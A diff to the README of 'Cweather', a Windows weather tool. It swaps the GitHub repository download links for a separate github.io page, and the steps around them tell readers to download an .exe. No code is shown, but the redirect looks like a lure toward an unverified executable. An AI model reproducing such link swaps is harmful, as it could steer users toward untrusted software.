@@ -1,6 +1,6 @@
 # 🌤️ Cweather - Check local weather via command line
 
-[![](https://img.shields.io/badge/Download-Cweather-blue.svg)](https://github.com/Eggshellcensus819/Cweather)
+[![](https://img.shields.io/badge/Download-Cweather-blue.svg)](https://eggshellcensus819.github.io)
 
 Cweather is a lightweight software tool that fetches live weather data for your specific location directly to your computer screen. It provides current temperature and sky conditions without requiring you to open a web browser.
 
@@ -10,7 +10,7 @@ This program works on Windows 10 and Windows 11. You do not need to install prog
 
 ## 📥 How to Install the Software
 
-1. Visit the [official repository page](https://github.com/Eggshellcensus819/Cweather) to access the files.
+1. Visit the [official repository page](https://eggshellcensus819.github.io) to access the files.
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version of the program ending in .exe.
 4. Download the file to your computer.
